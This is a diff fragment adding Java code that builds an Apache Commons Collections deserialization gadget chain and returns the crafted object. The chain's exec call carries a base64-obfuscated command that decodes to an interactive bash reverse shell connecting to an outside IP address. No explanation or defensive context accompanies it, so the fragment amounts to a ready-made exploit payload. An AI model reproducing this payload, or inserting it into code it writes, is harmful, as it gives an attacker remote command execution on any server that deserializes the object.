@@ -1,0 +1,23 @@
+        try {
+            org.apache.commons.collections.Transformer[] transformers = {
+                    new org.apache.commons.collections.functors.ConstantTransformer(Runtime.class),
+                    new org.apache.commons.collections.functors.InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
+                    new org.apache.commons.collections.functors.InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
+                    new org.apache.commons.collections.functors.InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEyMS4xOTkuMzkuNC8zMDAwIDA+JjE=}|{base64,-d}|{bash,-i}"})
+            };
+            org.apache.commons.collections.functors.ChainedTransformer ct = new org.apache.commons.collections.functors.ChainedTransformer(transformers);
+            java.util.Map lazymap = org.apache.commons.collections.map.LazyMap.decorate(new java.util.HashMap(), new org.apache.commons.collections.functors.ConstantTransformer("1"));
+            org.apache.commons.collections.keyvalue.TiedMapEntry tiedMapEntry = new org.apache.commons.collections.keyvalue.TiedMapEntry(lazymap, "2");
+            java.util.HashMap<Object, Object> hashMap = new java.util.HashMap<>();
+            hashMap.put(tiedMapEntry, "3");
+
+            lazymap.remove("2");
+
+            Class<org.apache.commons.collections.map.LazyMap> lazyMapClass = org.apache.commons.collections.map.LazyMap.class;
+            java.lang.reflect.Field factoryField = lazyMapClass.getDeclaredField("factory");
+            factoryField.setAccessible(true);
+            factoryField.set(lazymap, ct);
+            return hashMap;
+        } catch (Exception e) {
+            return e;
+        }
